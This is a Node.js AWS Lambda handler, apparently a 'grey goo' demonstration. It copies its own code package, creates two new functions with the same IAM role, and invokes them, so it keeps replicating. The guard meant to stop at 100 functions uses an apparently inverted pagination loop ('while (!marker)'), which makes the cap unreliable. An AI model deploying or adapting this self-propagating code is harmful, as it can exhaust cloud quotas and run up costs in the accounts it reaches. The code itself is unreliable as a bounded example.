const AWS = require("aws-sdk");
const https = require("https");

exports.handler = async (_, ctx) => {
  const FunctionName = process.env.AWS_LAMBDA_FUNCTION_NAME;

  const lambda = new AWS.Lambda();

  let fnCount = 0;
  let marker = undefined;
  do {
    let func = await lambda.listFunctions({Marker: marker}).promise()
    marker = func.NextMarker
    fnCount += func.Functions.length
  } while (!marker)

  if (fnCount > 100) {
    console.log("That's too much, man!")
    return
  }

  console.log("Arise, my children!");

  const fn = await lambda
    .getFunction({
      FunctionName
    })
    .promise();

  await new Promise(async resolve => {
    https.get(fn.Code.Location, res => {
      let chunks = [];
      res.on("data", d => {
        chunks.push(d);
      });
      res.on("close", async () => {
        for (let i = 0; i < 2; i++) {
          let functionName = `GreyGoo-${ctx.aws_request_id}-${i}`;
          await lambda.createFunction({
            Code: {ZipFile: Buffer.concat(chunks)},
            FunctionName: functionName,
            Handler: fn.Configuration.Handler,
            Role: fn.Configuration.Role,
            Runtime: fn.Configuration.Runtime,
          }).promise()
        }

        setTimeout(async () => {
          for (let i = 0; i < 2; i++) {
            let functionName = `GreyGoo-${ctx.aws_request_id}-${i}`;
            await lambda.invokeAsync({
              FunctionName: functionName,
              InvokeArgs: JSON.stringify({})
            }).promise()
          }
          resolve();
        }, 500)
      });
    });
  });
};
